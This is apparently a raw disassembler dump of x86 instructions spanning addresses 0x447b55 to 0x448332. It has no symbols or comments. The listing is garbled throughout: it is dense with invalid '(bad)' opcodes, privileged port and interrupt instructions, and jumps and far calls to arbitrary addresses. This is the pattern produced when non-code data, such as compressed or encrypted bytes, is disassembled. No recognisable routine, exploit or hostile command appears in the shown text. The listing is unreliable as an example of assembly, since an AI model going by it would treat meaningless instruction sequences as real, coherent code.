  447b55:	jp     0x447bb5
  447b57:	and    al,0x61
  447b59:	addr16 das 
  447b5b:	mov    ?,WORD PTR [eax+0x2261bb48]
  447b61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  447b62:	inc    esp
  447b63:	pop    edi
  447b64:	(bad)  
  447b65:	jns    0x447b93
  447b67:	push   edi
  447b68:	(bad)  
  447b69:	sub    BYTE PTR [eax-0x5e],0x71
  447b6d:	add    esp,DWORD PTR [edx-0x63]
  447b70:	in     al,0x3
  447b72:	sbb    DWORD PTR [esi-0x89f21dd],esp
  447b78:	xor    eax,0xb4f4efac
  447b7d:	xor    eax,0x28a0d469
  447b82:	ss leave 
  447b84:	fucomp st(0)
  447b86:	add    eax,0xcb6dd838
  447b8b:	ret    0x6b88
  447b8e:	mov    al,0xae
  447b90:	scas   eax,DWORD PTR es:[edi]
  447b91:	retf   0x1fe7
  447b94:	in     eax,0x2
  447b96:	cli    
  447b97:	es repz retf 0xa7fa
  447b9c:	and    ch,BYTE PTR [ebx+0x1f]
  447b9f:	lods   eax,DWORD PTR ds:[esi]
  447ba0:	cmp    esi,edi
  447ba2:	and    eax,0x1d4adcf3
  447ba7:	aam    0xbf
  447ba9:	fistp  QWORD PTR [edi-0x11547de2]
  447baf:	dec    esi
  447bb0:	mov    BYTE PTR ds:0x7c59838,dh
  447bb6:	neg    BYTE PTR [ebp+0x79]
  447bb9:	dec    ebx
  447bba:	sbb    BYTE PTR [edi],dh
  447bbc:	mov    ch,0x24
  447bbe:	add    dh,dl
  447bc0:	xchg   ebp,eax
  447bc1:	ja     0x447b61
  447bc3:	xchg   edx,eax
  447bc4:	pop    ebx
  447bc5:	pop    esp
  447bc6:	sub    al,0x69
  447bc8:	pop    DWORD PTR [ebp-0x22]
  447bcb:	xchg   esp,eax
  447bcc:	or     BYTE PTR [ebx+0x16],bl
  447bcf:	je     0x447be3
  447bd1:	add    dl,bl
  447bd3:	aam    0x27
  447bd5:	sti    
  447bd6:	outs   dx,BYTE PTR ds:[esi]
  447bd7:	cmc    
  447bd8:	loope  0x447c49
  447bda:	sub    al,0x47
  447bdc:	mov    BYTE PTR [ebx+0x5e],al
  447bdf:	mov    dh,0x8e
  447be1:	xchg   ebp,eax
  447be2:	pop    esi
  447be3:	in     eax,dx
  447be4:	add    al,BYTE PTR [ebp+0x20]
  447be7:	dec    esi
  447be8:	iret   
  447be9:	add    bl,BYTE PTR [edi-0x31]
  447bec:	inc    esp
  447bed:	lods   eax,DWORD PTR ds:[esi]
  447bee:	das    
  447bef:	mov    DWORD PTR ss:[ebx],edx
  447bf2:	mov    eax,ds:0x8e7c3f15
  447bf7:	and    DWORD PTR [eax+0x5ac53002],esi
  447bfd:	push   0x9e23ff6
  447c02:	inc    ebp
  447c03:	fwait
  447c04:	int3   
  447c05:	(bad)  
  447c06:	pop    ds
  447c07:	or     edi,DWORD PTR [edx-0x47]
  447c0a:	pushf  
  447c0b:	es push esp
  447c0d:	add    ebp,DWORD PTR [eax+0x7b]
  447c10:	or     bl,dl
  447c12:	inc    edi
  447c13:	xor    eax,0x5fcf06f8
  447c18:	icebp  
  447c19:	add    eax,0x4b9ff39c
  447c1e:	adc    bl,BYTE PTR [ebx-0x5d]
  447c21:	sbb    BYTE PTR [esi-0x1c47bce3],cl
  447c27:	aad    0x17
  447c29:	fist   WORD PTR [edx]
  447c2b:	fmul   DWORD PTR [edx+0x29080a79]
  447c31:	outs   dx,BYTE PTR ds:[esi]
  447c32:	test   BYTE PTR [edi+0x20],dh
  447c35:	xor    DWORD PTR [edx],edi
  447c37:	pushf  
  447c38:	mov    dl,0xa5
  447c3a:	retf   0xe254
  447c3d:	adc    eax,DWORD PTR [edi]
  447c3f:	retf   0xa83a
  447c42:	pop    ds
  447c43:	push   ebp
  447c44:	xor    BYTE PTR [ebx+ecx*2+0x7c90b2d],dh
  447c4b:	repz pop eax
  447c4d:	add    esp,DWORD PTR [esp+edi*4-0x16]
  447c51:	and    ebp,DWORD PTR [edi+eax*4-0x7c]
  447c55:	jmp    0x1d17b851
  447c5a:	adc    al,0x23
  447c5c:	mov    dh,BYTE PTR [edi]
  447c5e:	and    ah,BYTE PTR [esi+edi*1+0x16]
  447c62:	sbb    edx,esp
  447c64:	or     ebx,DWORD PTR [edx]
  447c66:	sti    
  447c67:	mov    dl,0x38
  447c69:	call   0x960:0xf263299c
  447c70:	mov    al,0x26
  447c72:	pushf  
  447c73:	in     eax,0x61
  447c75:	cmp    al,0xf8
  447c77:	fld1   
  447c79:	pop    es
  447c7a:	out    0xd5,eax
  447c7c:	mov    al,ds:0x65c69e7c
  447c81:	push   ebx
  447c82:	jmp    DWORD PTR [ebp-0x78]
  447c85:	adc    eax,0x2f98b487
  447c8a:	stos   DWORD PTR es:[edi],eax
  447c8b:	iret   
  447c8c:	xchg   esp,eax
  447c8d:	add    eax,0xae559d9e
  447c92:	and    eax,0x1e70bb7a
  447c97:	jno    0x447c51
  447c99:	lods   al,BYTE PTR ds:[esi]
  447c9a:	inc    ebp
  447c9b:	out    dx,al
  447c9c:	push   eax
  447c9d:	outs   dx,DWORD PTR ds:[esi]
  447c9e:	pop    edi
  447c9f:	cwde   
  447ca0:	pop    eax
  447ca1:	leave  
  447ca2:	(bad)  
  447ca4:	ins    BYTE PTR es:[edi],dx
  447ca5:	xor    BYTE PTR [edx+ebp*1+0x3c],ah
  447ca9:	jae    0x447cca
  447cab:	int    0xc2
  447cad:	sbb    esi,esi
  447caf:	adc    ebp,DWORD PTR [eax-0x76]
  447cb2:	inc    ecx
  447cb3:	shl    ch,cl
  447cb5:	xchg   bl,bl
  447cb7:	sub    DWORD PTR [edx],0x98700e7
  447cbd:	arpl   WORD PTR [edi],bx
  447cbf:	aas    
  447cc0:	adc    esi,DWORD PTR ds:0xf4544318
  447cc6:	xlat   BYTE PTR ds:[ebx]
  447cc7:	adc    DWORD PTR [ebx],edi
  447cc9:	add    DWORD PTR [edx],ebx
  447ccb:	shl    DWORD PTR [edx],0x52
  447cce:	shl    DWORD PTR [edi],1
  447cd0:	inc    esi
  447cd1:	stos   BYTE PTR es:[edi],al
  447cd2:	and    BYTE PTR [eax+ecx*4],dl
  447cd5:	mov    ecx,0xa6f4c670
  447cda:	dec    esi
  447cdb:	(bad)  
  447cdc:	pop    esp
  447cdd:	add    ch,BYTE PTR [edi+eiz*2-0xc4ce32f]
  447ce4:	fiadd  DWORD PTR [ecx]
  447ce6:	sub    edx,DWORD PTR [ecx+0x38]
  447ce9:	push   cs
  447cea:	pop    ecx
  447ceb:	aam    0x79
  447ced:	mov    bh,al
  447cef:	jno    0x447cc3
  447cf1:	mov    WORD PTR [edx],ds
  447cf3:	xlat   BYTE PTR ds:[ebx]
  447cf4:	test   BYTE PTR [esi-0x1c],ch
  447cf7:	mov    dh,0xf4
  447cf9:	sub    BYTE PTR [edi],bh
  447cfb:	push   ebp
  447cfc:	mov    DWORD PTR [ecx+0x49b72dc],esi
  447d02:	mov    ds:0x258df1af,eax
  447d07:	mov    cl,BYTE PTR [ecx-0x63897150]
  447d0d:	mov    DWORD PTR [ecx+0x6dcf5917],ecx
  447d13:	stos   DWORD PTR es:[edi],eax
  447d14:	mov    edx,0x29b733ee
  447d19:	jmp    0x4c0244bf
  447d1e:	scas   al,BYTE PTR es:[edi]
  447d1f:	jge    0x447d9e
  447d21:	xchg   ebp,eax
  447d22:	mov    eax,ds:0x55c201c0
  447d27:	or     al,0x38
  447d29:	repz popa 
  447d2b:	popa   
  447d2c:	or     ch,BYTE PTR [ecx+0x6db5bf5e]
  447d32:	fild   QWORD PTR [ecx+0x9f417ac]
  447d38:	mov    edx,0x76761729
  447d3e:	xchg   BYTE PTR [eax],al
  447d40:	xchg   DWORD PTR [edi-0x61838883],edx
  447d46:	fild   QWORD PTR [ecx-0x2b14a052]
  447d4c:	(bad)  
  447d4d:	out    dx,eax
  447d4e:	xchg   ebp,eax
  447d4f:	call   0xb38f:0x6867dea0
  447d56:	push   ecx
  447d57:	out    dx,eax
  447d58:	lock pop edx
  447d5a:	pop    edi
  447d5b:	xor    eax,0xd12c874c
  447d60:	add    bh,bh
  447d62:	std    
  447d63:	rol    BYTE PTR [esi],cl
  447d65:	pop    eax
  447d66:	mov    ?,esp
  447d68:	in     al,0xda
  447d6a:	pop    ds
  447d6b:	xlat   BYTE PTR ds:[ebx]
  447d6c:	jo     0x447d1b
  447d6e:	pop    eax
  447d6f:	xchg   edi,eax
  447d70:	aam    0x53
  447d72:	(bad)  
  447d73:	aam    0xe8
  447d75:	fild   WORD PTR [eax]
  447d77:	fstp   DWORD PTR [edi-0x69a01b0c]
  447d7d:	outs   dx,DWORD PTR ds:[esi]
  447d7e:	ins    BYTE PTR es:[edi],dx
  447d7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  447d80:	push   ds
  447d81:	sbb    DWORD PTR [ebx+0x41],0x3c
  447d85:	push   ds
  447d86:	adc    esi,0xc46091af
  447d8c:	gs loope 0x447da1
  447d8f:	scas   al,BYTE PTR es:[edi]
  447d90:	jno    0x447d8b
  447d92:	jno    0x447d23
  447d94:	or     DWORD PTR [edi-0x56],ebx
  447d97:	xor    DWORD PTR [ecx-0x1a091bfb],0x6b
  447d9e:	pop    esp
  447d9f:	jecxz  0x447d6e
  447da1:	jbe    0x447de2
  447da3:	in     al,0x86
  447da5:	retf   
  447da6:	xor    eax,0xbe73f165
  447dab:	sar    DWORD PTR [edx-0x6055e5e9],cl
  447db1:	mov    ecx,0x832f77b6
  447db6:	xchg   edi,eax
  447db7:	push   esi
  447db8:	or     BYTE PTR [esi+ecx*4],bh
  447dbb:	ret    
  447dbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  447dbd:	or     ebx,DWORD PTR [edi]
  447dbf:	pop    ds
  447dc0:	sbb    bh,cl
  447dc2:	popa   
  447dc3:	mov    al,0x76
  447dc5:	(bad)  
  447dc6:	sub    bh,dl
  447dc8:	dec    ecx
  447dc9:	addr16 test eax,0x95077e1e
  447dcf:	push   ebx
  447dd0:	mov    DWORD PTR [edi-0x37],ebp
  447dd3:	pop    edx
  447dd4:	and    DWORD PTR [esi+0x48352e59],0x1c
  447ddb:	mov    WORD PTR [ecx+0x3],fs
  447dde:	punpckhbw mm5,QWORD PTR ds:0x8ef77896
  447de5:	sub    eax,0x15bc7aed
  447dea:	sub    al,0xe4
  447dec:	cwde   
  447ded:	js     0x447e6e
  447def:	aad    0xc9
  447df1:	dec    ecx
  447df2:	or     al,0x86
  447df4:	xor    al,0x1f
  447df6:	or     eax,0x74efa423
  447dfb:	fwait
  447dfc:	mov    BYTE PTR [edi],bl
  447dfe:	cwde   
  447dff:	loope  0x447dd7
  447e01:	mov    esi,0x21f44b4
  447e06:	sbb    bl,cl
  447e08:	fwait
  447e09:	jb     0x447db8
  447e0b:	shr    DWORD PTR [eax+edx*8+0x3ad18f1f],1
  447e12:	bound  ebx,QWORD PTR [edi+0x18]
  447e15:	adc    esi,edx
  447e17:	aam    0xd8
  447e19:	jge    0x447e3c
  447e1b:	ja     0x447e2b
  447e1d:	inc    ecx
  447e1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  447e1f:	push   0xffffff87
  447e21:	fisttp WORD PTR [edi]
  447e23:	sahf   
  447e24:	ins    BYTE PTR es:[edi],dx
  447e25:	mov    edi,0x810cf45f
  447e2a:	ror    cl,cl
  447e2c:	dec    BYTE PTR [ebx]
  447e2e:	(bad)  
  447e30:	enter  0x3056,0xe5
  447e34:	and    cl,BYTE PTR ds:0x5189a6bd
  447e3a:	dec    ebx
  447e3b:	fisub  WORD PTR [edi-0x3b]
  447e3e:	sub    cl,BYTE PTR [edi]
  447e40:	sbb    DWORD PTR [ebx],eax
  447e42:	mov    edx,0xb8ae9f95
  447e47:	rcl    edi,cl
  447e49:	mov    ah,BYTE PTR [ecx-0x7b]
  447e4c:	(bad)  
  447e4e:	and    ah,BYTE PTR [ebx+eiz*8]
  447e51:	clc    
  447e52:	rcl    DWORD PTR [eax+0x34],0x83
  447e56:	lods   eax,DWORD PTR ds:[esi]
  447e57:	js     0x447eac
  447e59:	sbb    ah,dl
  447e5b:	mov    ebx,DWORD PTR [esi]
  447e5d:	push   ebp
  447e5e:	mov    cl,0xc1
  447e60:	mov    BYTE PTR [eax],dh
  447e62:	data16 jne 0x447eac
  447e65:	sbb    BYTE PTR [edi*2+0x5be4b024],bl
  447e6c:	mov    DWORD PTR [esi+eax*2-0x6fd33e2f],ecx
  447e73:	sbb    eax,0x1b1fa9f8
  447e78:	xor    DWORD PTR gs:[eax-0x68],esp
  447e7c:	inc    ebp
  447e7d:	jne    0x447e9e
  447e7f:	lea    esp,[edx]
  447e81:	jno    0x447e24
  447e83:	(bad)  [eax-0x195502d1]
  447e89:	int    0xa0
  447e8b:	shl    BYTE PTR [esp+esi*8+0x43],0xf5
  447e90:	inc    ebp
  447e91:	jl     0x447e43
  447e93:	pop    edi
  447e94:	mov    bl,0x75
  447e96:	je     0x447ee5
  447e98:	or     BYTE PTR [eax+0x6700acf8],ah
  447e9e:	adc    al,0xd4
  447ea0:	es sahf 
  447ea2:	inc    edx
  447ea3:	and    BYTE PTR [ecx*8+0x35889455],0xe8
  447eab:	dec    esp
  447eac:	fdivr  st,st(6)
  447eae:	xor    esp,DWORD PTR [eax+0x57]
  447eb1:	add    bl,BYTE PTR [eax-0x555d118f]
  447eb7:	push   edi
  447eb8:	inc    edx
  447eb9:	dec    edi
  447eba:	push   es
  447ebb:	xor    BYTE PTR [eax-0x16f63643],cl
  447ec1:	mov    ah,0x48
  447ec3:	and    DWORD PTR ds:0xe1450c4b,esi
  447ec9:	test   DWORD PTR [ebx],eax
  447ecb:	cmp    edi,DWORD PTR ds:0x89fed1c3
  447ed1:	xor    eax,0x8a308bb9
  447ed6:	push   edi
  447ed7:	inc    ecx
  447ed8:	into   
  447ed9:	add    bl,BYTE PTR [eax]
  447edb:	mov    edx,0xb9c7e7cb
  447ee0:	aam    0xe0
  447ee2:	pusha  
  447ee3:	pop    es
  447ee4:	mov    WORD PTR [edi+0x5c],cs
  447ee7:	push   0xd74689b8
  447eec:	bound  ebx,QWORD PTR [ecx-0xd73f486]
  447ef2:	cmp    ch,BYTE PTR [edi]
  447ef4:	pop    ecx
  447ef5:	adc    BYTE PTR [ebp+0x2b],bh
  447ef8:	ss mov edi,0x75449542
  447efe:	sbb    DWORD PTR [esi+eiz*8+0x5],ebp
  447f02:	push   0x6f
  447f04:	mov    esi,0x692665bf
  447f09:	dec    ecx
  447f0a:	push   ds
  447f0b:	xchg   edi,eax
  447f0c:	(bad)  
  447f0e:	stos   DWORD PTR es:[edi],eax
  447f0f:	cmp    al,0x30
  447f11:	jg     0x447f8f
  447f13:	aad    0x16
  447f15:	cli    
  447f16:	add    ebx,DWORD PTR [edi-0x38]
  447f19:	cdq    
  447f1a:	les    ebx,FWORD PTR [edx]
  447f1c:	sti    
  447f1d:	out    0x48,eax
  447f1f:	aad    0x1a
  447f21:	and    BYTE PTR [ecx-0x34b5176e],bl
  447f27:	lock fwait
  447f29:	add    ah,al
  447f2b:	mov    WORD PTR [edx+0x0],gs
  447f2e:	or     BYTE PTR [ebp-0x75],al
  447f31:	pusha  
  447f32:	out    dx,eax
  447f33:	inc    ebp
  447f34:	test   DWORD PTR [ecx],edi
  447f36:	cmp    ch,BYTE PTR [edx-0x76]
  447f39:	jg     0x447f65
  447f3b:	pop    esi
  447f3c:	mov    edx,0x12c32739
  447f41:	add    edi,DWORD PTR [eax-0x48]
  447f44:	push   esi
  447f45:	ret    
  447f46:	adc    DWORD PTR [ebx+0x6f1e3b6d],ebp
  447f4c:	mov    ecx,0x5e76294b
  447f51:	leave  
  447f52:	jg     0x447f28
  447f54:	sub    dl,BYTE PTR [esi+0x255b1afd]
  447f5a:	inc    esp
  447f5b:	or     DWORD PTR [eax-0x7cd64521],ecx
  447f61:	sbb    al,BYTE PTR [eax+0x69]
  447f64:	rol    DWORD PTR [edx],cl
  447f66:	ror    bh,1
  447f68:	ret    0xa206
  447f6b:	test   eax,0xc51ff3de
  447f70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  447f71:	jp     0x447f08
  447f73:	mov    edi,0xd4bc75b2
  447f78:	cmp    eax,0xb2b0a1a9
  447f7d:	mov    eax,0xfb8f3f2a
  447f82:	inc    edx
  447f83:	jnp    0x447f2b
  447f85:	test   eax,0x30c955af
  447f8a:	popa   
  447f8b:	fcom   DWORD PTR [edx+eax*1-0x4ecc6dae]
  447f92:	icebp  
  447f93:	pop    ebx
  447f94:	adc    al,dl
  447f96:	pusha  
  447f97:	addr16 je 0x447f90
  447f9a:	mov    ah,0x37
  447f9c:	shr    BYTE PTR [eax+ebp*8-0x29],1
  447fa0:	push   0xa
  447fa2:	xor    BYTE PTR [ecx-0x3aae7e6],ch
  447fa8:	xchg   BYTE PTR [ecx+0x44d7df60],cl
  447fae:	jle    0x447ff4
  447fb0:	push   cs
  447fb1:	aaa    
  447fb2:	push   esi
  447fb3:	cwde   
  447fb4:	jmp    0x3e780211
  447fb9:	add    dl,bl
  447fbb:	test   al,0x90
  447fbd:	jb     0x447ffe
  447fbf:	out    dx,eax
  447fc0:	fstp   QWORD PTR [ecx+eax*1+0x1fe35c17]
  447fc7:	cmp    eax,0xe50ca7a0
  447fcc:	push   ebx
  447fcd:	push   edi
  447fce:	mov    ebp,0x4b8f92dd
  447fd3:	jecxz  0x447f5d
  447fd5:	ret    0x73fa
  447fd8:	push   0x64
  447fda:	cmp    esp,DWORD PTR [ecx+ecx*4+0x345a2313]
  447fe1:	jp     0x447fa9
  447fe3:	inc    ebp
  447fe4:	mov    ecx,0xf0e01805
  447fe9:	add    eax,0xe20bf4ff
  447fee:	arpl   WORD PTR [edi-0x566fe9b1],cx
  447ff4:	dec    edx
  447ff5:	ret    
  447ff6:	ds (bad) 
  447ff8:	test   BYTE PTR ds:0x46b8f8a6,0x99
  447fff:	jp     0x447fd5
  448001:	push   edx
  448002:	pop    ds
  448003:	lods   eax,DWORD PTR ds:[esi]
  448004:	and    eax,0x384d2a60
  448009:	dec    eax
  44800a:	stc    
  44800b:	aad    0xfd
  44800d:	push   0xdc969773
  448012:	popf   
  448013:	add    DWORD PTR [ecx+0x3323e155],ecx
  448019:	fcom   DWORD PTR [edx+0xc033802]
  44801f:	(bad)  
  448020:	push   ebp
  448021:	fisttp DWORD PTR [ecx+0x7c]
  448024:	or     BYTE PTR [esi+eiz*2-0x67344683],0xe0
  44802c:	push   ecx
  44802d:	loopne 0x447fbb
  44802f:	or     BYTE PTR [eax+0x63],bl
  448032:	jbe    0x448008
  448034:	retf   0xb69e
  448037:	(bad)  
  448039:	nop
  44803a:	mov    esp,0x47d78993
  44803f:	iret   
  448040:	pop    esi
  448041:	mov    edx,0x1adc117f
  448046:	cs and cl,bh
  448049:	fist   DWORD PTR [eax]
  44804b:	xlat   BYTE PTR ds:[ebx]
  44804c:	xchg   ebp,eax
  44804d:	or     DWORD PTR [edx+0x6e3b8994],ebx
  448053:	iret   
  448054:	(bad)  
  448055:	stos   DWORD PTR es:[edi],eax
  448056:	mov    bl,0x7a
  448058:	mov    edi,0x898e9d8b
  44805d:	and    DWORD PTR [esi+0x751cd4b3],esi
  448063:	inc    eax
  448064:	mov    bl,dl
  448066:	lahf   
  448067:	add    eax,0x67ddbaf1
  44806c:	arpl   WORD PTR [ebx],ax
  44806e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44806f:	call   0xdbaffea6
  448074:	fstp   DWORD PTR [ebp+0x1e]
  448077:	add    DWORD PTR [eax+0x524dfaf3],eax
  44807d:	js     0x448086
  44807f:	in     al,dx
  448080:	or     dh,bl
  448082:	mov    edx,ebp
  448084:	inc    ecx
  448085:	fcomp  DWORD PTR [edx+0x58]
  448088:	bnd jp 0x448095
  44808b:	add    al,0x88
  44808d:	xchg   DWORD PTR [esi-0x4960e6a3],ecx
  448093:	stos   BYTE PTR es:[edi],al
  448094:	(bad)  
  448095:	test   BYTE PTR es:[edi-0x52],dl
  448099:	loopne 0x44807b
  44809b:	adc    eax,0x99f4146c
  4480a0:	jo     0x4480ac
  4480a2:	pop    ds
  4480a3:	inc    edi
  4480a4:	cmp    esp,DWORD PTR [ecx+eax*8+0x669b62bb]
  4480ab:	stos   BYTE PTR es:[edi],al
  4480ac:	loop   0x448093
  4480ae:	sti    
  4480af:	adc    bh,BYTE PTR [ebp+0x1db65445]
  4480b5:	cmp    ch,BYTE PTR ds:[ecx]
  4480b8:	mov    bl,ch
  4480ba:	call   0x2447:0xe18e6671
  4480c1:	add    BYTE PTR [esi-0x6b73c8df],dl
  4480c7:	nop
  4480c8:	push   ebp
  4480c9:	or     ebp,DWORD PTR [eax-0x36a764a]
  4480cf:	and    DWORD PTR [esi],edi
  4480d1:	xchg   BYTE PTR [esi+edx*1-0x276ffdfa],al
  4480d8:	daa    
  4480d9:	repnz aam 0x41
  4480dc:	lea    esi,[edi+ebx*1-0x35]
  4480e0:	adc    BYTE PTR [ecx-0x3f6d67e4],cl
  4480e6:	mov    ecx,0xe2df86b8
  4480eb:	(bad)
  4480ef:	xchg   esi,eax
  4480f0:	cli    
  4480f1:	sub    al,0x1e
  4480f3:	add    eax,0x25bb36a3
  4480f8:	in     al,dx
  4480f9:	adc    DWORD PTR [ecx],esi
  4480fb:	aam    0x97
  4480fd:	aad    0x5
  4480ff:	in     eax,0x28
  448101:	ins    BYTE PTR es:[edi],dx
  448102:	sbb    esi,DWORD PTR [edx]
  448104:	outs   dx,DWORD PTR ds:[esi]
  448105:	push   0x69ae91f
  44810a:	push   0xbe756bdf
  44810f:	xchg   ebp,eax
  448110:	sub    al,0xb7
  448112:	mov    bh,0xd5
  448114:	fdivr  DWORD PTR [ebp+0x777e23bd]
  44811a:	pop    es
  44811b:	push   ecx
  44811c:	dec    esp
  44811d:	sub    eax,0xda67171f
  448122:	sub    al,0xdb
  448124:	shr    DWORD PTR [esi],0x33
  448127:	fsub   QWORD PTR [esp]
  44812a:	sbb    cl,BYTE PTR ds:0x19dfba98
  448130:	imul   edi
  448132:	aas    
  448133:	ins    BYTE PTR es:[edi],dx
  448134:	mov    BYTE PTR [ebx+0x2e],bl
  448137:	clc    
  448138:	sbb    BYTE PTR [esi-0x18],al
  44813b:	xchg   cl,cl
  44813d:	add    eax,0xe079c2a0
  448142:	xor    esp,ebx
  448144:	js     0x448179
  448146:	push   esi
  448147:	arpl   WORD PTR [esi-0x48],bp
  44814a:	bound  ebx,QWORD PTR [ebx+0x10]
  44814d:	mov    eax,0xbb32cc6d
  448152:	enter  0x876c,0x3
  448156:	fs in  eax,dx
  448158:	enter  0x4185,0x56
  44815c:	ja     0x448159
  44815e:	or     BYTE PTR [edx-0x57be8fd8],0x89
  448165:	mov    DWORD PTR [eax-0x14be09bf],edi
  44816b:	push   0xfaba0222
  448170:	ins    BYTE PTR es:[edi],dx
  448171:	rcr    BYTE PTR [ecx+eax*8],0x79
  448175:	shl    BYTE PTR [esi+0x1f],1
  448178:	loop   0x44812b
  44817a:	xchg   esi,eax
  44817b:	aad    0xbf
  44817d:	and    eax,DWORD PTR [ecx+0x805fc16]
  448183:	mov    bh,0x38
  448185:	in     al,dx
  448186:	ret    0x8371
  448189:	mov    ah,0xd7
  44818b:	retf   
  44818c:	loopne 0x44818e
  44818e:	xchg   esp,eax
  44818f:	ins    DWORD PTR es:[edi],dx
  448190:	xchg   ebx,eax
  448191:	adc    eax,0x890864e2
  448196:	inc    edi
  448197:	mov    ds:0x1185942,al
  44819c:	mov    DWORD PTR [ecx],ebp
  44819e:	or     DWORD PTR cs:[ecx],ecx
  4481a1:	popa   
  4481a2:	pop    ds
  4481a3:	adc    edi,DWORD PTR [eax-0x671550cc]
  4481a9:	sub    DWORD PTR [esi],edi
  4481ab:	aam    0xb1
  4481ad:	icebp  
  4481ae:	pop    ecx
  4481af:	pusha  
  4481b0:	das    
  4481b1:	inc    ebx
  4481b2:	mov    ebp,0x932010e3
  4481b7:	aad    0x55
  4481b9:	ins    DWORD PTR es:[edi],dx
  4481ba:	stos   DWORD PTR es:[edi],eax
  4481bb:	sbb    DWORD PTR [ecx+0x57],esp
  4481be:	aad    0x12
  4481c0:	ins    BYTE PTR es:[edi],dx
  4481c1:	cmp    bh,BYTE PTR [ecx]
  4481c3:	sub    BYTE PTR [eax-0x5f8e058c],bl
  4481c9:	pop    edi
  4481ca:	mov    ah,0x9d
  4481cc:	sbb    ebx,DWORD PTR ds:0xb2349cc
  4481d2:	bound  eax,QWORD PTR [eax+0x7eba82da]
  4481d8:	add    ah,BYTE PTR [edi]
  4481da:	add    ah,ch
  4481dc:	and    edx,0xbd9922e0
  4481e2:	(bad)  
  4481e3:	retf   0x6788
  4481e6:	imul   ecx,DWORD PTR [edx-0x2028427b],0x1a
  4481ed:	daa    
  4481ee:	push   esi
  4481ef:	adc    bl,ah
  4481f1:	xor    BYTE PTR [edi-0x3a1bacc0],bl
  4481f7:	loopne 0x448181
  4481f9:	mov    bl,0xaf
  4481fb:	ja     0x4481db
  4481fd:	or     eax,0x311c2ee
  448202:	out    0xa0,al
  448204:	pop    ebx
  448205:	(bad)  
  448206:	jno    0x4481ac
  448208:	js     0x448246
  44820a:	pop    ds
  44820b:	xlat   BYTE PTR ds:[ebx]
  44820c:	leave  
  44820d:	jle    0x4481cc
  44820f:	lock dec edx
  448211:	and    cl,BYTE PTR [ebp+edx*8-0x2d4b253b]
  448218:	sti    
  448219:	mul    DWORD PTR [edi+0x1fc4622c]
  44821f:	xchg   edi,eax
  448220:	daa    
  448221:	bound  edi,QWORD PTR [ecx+0x3a4a2117]
  448227:	ror    DWORD PTR [eax-0x10],0x4b
  44822b:	aad    0xc1
  44822d:	repnz sub ebp,DWORD PTR [edi+0x7b386dbf]
  448234:	mov    DWORD PTR ds:0x7dbb588f,eax
  44823a:	push   ecx
  44823b:	fcmovu st,st(6)
  44823d:	sbb    al,0x8c
  44823f:	or     edx,DWORD PTR [edi]
  448241:	cmp    DWORD PTR [esi-0x9],edx
  448244:	mov    eax,0x6f949efe
  448249:	test   al,0x5a
  44824b:	cdq    
  44824c:	gs ror ah,1
  44824f:	out    0x58,al
  448251:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  448252:	pusha  
  448253:	or     eax,0x4fc0bd4
  448258:	pushf  
  448259:	sub    al,0x7e
  44825b:	inc    esi
  44825c:	mov    cl,0xaf
  44825e:	jb     0x448271
  448260:	or     BYTE PTR [ecx+0xc],bh
  448263:	sbb    BYTE PTR [edx],0x7d
  448266:	test   esp,0x6fce0257
  44826c:	cdq    
  44826d:	mov    ah,0x81
  44826f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  448270:	jnp    0x448269
  448272:	pop    ds
  448273:	adc    eax,0x745eea71
  448278:	enter  0x6054,0xba
  44827c:	out    dx,al
  44827d:	(bad)  
  44827e:	adc    ebx,ebp
  448280:	or     ebx,ebx
  448282:	jg     0x4482a6
  448284:	les    edi,FWORD PTR [esi]
  448286:	push   ds
  448287:	imul   ebx,DWORD PTR [eax],0xffffffa5
  44828a:	or     BYTE PTR [edi],al
  44828c:	pop    esi
  44828d:	jae    0x448285
  44828f:	cdq    
  448290:	cmp    bh,BYTE PTR [esi+0xc]
  448293:	xlat   BYTE PTR ds:[ebx]
  448294:	into   
  448295:	cmp    DWORD PTR [edi],0x1fe677b7
  44829b:	add    eax,DWORD PTR [ecx]
  44829d:	dec    edx
  44829e:	mov    esp,0xbceb6c3
  4482a3:	aam    0x55
  4482a5:	pop    ds
  4482a6:	lock dec eax
  4482a8:	mov    dh,0x39
  4482aa:	mov    esp,0x2f13893a
  4482af:	cwde   
  4482b0:	nop
  4482b1:	xchg   edx,eax
  4482b2:	enter  0xbe4f,0x2
  4482b6:	in     al,dx
  4482b7:	sti    
  4482b8:	imul   BYTE PTR [esi+0xb]
  4482bb:	adc    al,0xd0
  4482bd:	aas    
  4482be:	pop    edx
  4482bf:	stc    
  4482c0:	mov    bh,0xcb
  4482c2:	loopne 0x448338
  4482c4:	mov    eax,0xf452e313
  4482c9:	push   0x14
  4482cb:	add    dh,cl
  4482cd:	add    ah,BYTE PTR [esi-0x6b176fbc]
  4482d3:	mov    dl,0x7a
  4482d5:	sbb    bl,BYTE PTR [edi]
  4482d7:	mov    esi,esi
  4482d9:	daa    
  4482da:	stos   DWORD PTR es:[edi],eax
  4482db:	ror    DWORD PTR [ebp-0x540fd466],1
  4482e1:	add    dh,ah
  4482e3:	out    dx,al
  4482e4:	sub    BYTE PTR [ebx],0x83
  4482e7:	mov    bl,dl
  4482e9:	fisttp QWORD PTR [eax-0x137e713a]
  4482ef:	jmp    0x4482f9
  4482f1:	test   BYTE PTR [ecx+esi*1],ch
  4482f4:	xchg   ecx,eax
  4482f5:	dec    eax
  4482f6:	call   edx
  4482f8:	xchg   DWORD PTR es:[ebx+0x58],esi
  4482fc:	mov    DWORD PTR [ebp-0x34],ebp
  4482ff:	(bad)  
  448300:	xor    bh,bh
  448302:	or     al,0x46
  448304:	mov    DWORD PTR ds:0x88a60466,ebp
  44830a:	mov    ds:0xf6059be6,al
  44830f:	ins    BYTE PTR es:[edi],dx
  448310:	icebp  
  448311:	xchg   esi,eax
  448312:	fs push ss
  448314:	mov    esp,0xb9f91f17
  448319:	adc    eax,0x4b0e2686
  44831e:	xchg   BYTE PTR [edi+0x1cba1025],bl
  448324:	jmp    0x28aaccae
  448329:	pop    ds
  44832a:	(bad)  
  44832b:	stos   BYTE PTR es:[edi],al
  44832c:	(bad)  
  44832d:	rcl    esp,cl
  44832f:	nop
  448330:	xor    dl,dh
  448332:	dec    ebx
